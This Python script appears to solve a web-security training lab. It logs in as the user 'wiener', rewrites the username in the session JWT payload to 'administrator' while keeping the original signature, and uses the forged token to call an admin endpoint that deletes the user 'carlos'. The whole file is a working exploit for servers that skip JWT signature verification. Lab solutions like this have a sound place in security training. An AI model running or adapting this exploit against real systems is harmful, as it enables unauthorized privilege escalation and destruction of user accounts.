import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import jwt
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def login(url, s, username, password):

    # Extract the CSRF token
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)

    # Login as the user
    login_params = {'csrf': csrf_token, 'username': username, 'password': password}
    r = s.post(login_url, data=login_params, verify=False, proxies=proxies, allow_redirects=False)

    if r.status_code == 302:
        print("(+) Login is successful.")
        jwt = r.cookies['session']
        return jwt
    else:
        print("(-) Login not successful.")
        sys.exit(-1)

def jwt_sig_verification_attack(url, token):

    # Extract content of the jwt
    header, payload, signature = token.split('.')
    decoded_payload = base64.urlsafe_b64decode(payload + '=' *(-len(payload) %4))
    modified_payload = decoded_payload.replace(b'wiener', b'administrator')

    # Create new administrator token
    modified_payload_encoded = base64.urlsafe_b64encode(modified_payload).decode("utf-8")
    modified_token = f"{header}.{modified_payload_encoded}.{signature}"
    print("(+) Generated the administrator token.")

    # Use new token to delete user
    print("(+) Attempting to delete the user Carlos...")
    cookies = {'session': modified_token}
    delete_carlos_url = url + '/admin/delete?username=carlos'
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    res = r.text
    if "User deleted successfully" in res:
        print("(+) Successfully deleted the Carlos user!")
    else:
        print("(-) Attack was unsuccessful")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    regular_username = "wiener"
    regular_password = "peter"
    s = requests.Session()

    # Log in as a regular user
    regular_user_jwt = login(url, s, regular_username, regular_password)

    if (regular_user_jwt):

        # If login is successful, perform attack
        jwt_sig_verification_attack(url, regular_user_jwt)

if __name__ == "__main__":
    main()